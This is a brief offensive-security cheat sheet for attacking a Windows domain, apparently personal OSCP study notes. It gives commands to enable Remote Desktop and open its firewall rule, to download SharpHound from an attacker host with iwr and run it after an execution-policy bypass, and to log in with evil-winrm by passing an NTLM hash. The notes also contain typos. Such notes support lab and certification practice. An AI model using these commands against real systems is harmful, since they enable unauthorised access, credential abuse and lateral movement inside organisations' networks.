Windows: 

### open firewall
```
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
netsh advfirewall firewall set rule group="remote desktop" new enable=Yes
```

### Bloodhound 

```
.\Sharphoun.exe -c all,group 

PS C:\Users\marcus> iwr -uri http://<ip>:8000/SharpHound.ps1 -Outfile SharpHound.ps1
iwr -uri http://<ip>:8000/SharpHound.ps1 -Outfile SharpHound.ps1

PS C:\Users\marcus> powershell -ep bypass

PS C:\Users\marcus> . .\SharpHound.ps1

PS C:\Users\marcus> Invoke-BloodHound -CollectionMethod All
```

EVIL-WinRM:

once you login with evil-winrm 

```bash
evil-winrm -i 192.168.173.165 -u 'svc_apache' -H 4FC1682833B24CF2225248D67DF7E618 -e "<kali-path>"

$Evil-WinRM PS C:\> Invoke-Binary

$Evil-WinRM PS C:\> Invoke-Binary <kali-Path> run <paramter> 
```

This will help to connect **`metasploit`** this is userfull

https://github.com/tedchen0001/OSCP-Notes/blob/master/AD.md
